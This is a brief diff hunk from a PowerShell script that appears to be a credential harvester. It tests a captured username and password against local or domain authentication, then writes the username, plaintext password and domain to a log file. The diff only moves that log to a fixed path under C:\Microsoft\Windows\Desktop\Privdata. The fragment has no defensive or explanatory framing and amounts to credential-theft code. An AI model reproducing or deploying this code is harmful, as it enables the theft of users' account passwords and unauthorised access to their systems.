@@ -19,7 +19,7 @@ Param ()
             if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
             {
                 $output = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " DomainAuth:"+ $authdomain.name
-                $output > $env:UserProfile\Privdata\lifxe\LOG.TXT
+                $output > C:\Microsoft\Windows\Desktop\Privdata\lifxe\LOG.TXT
                 break
             }
         }
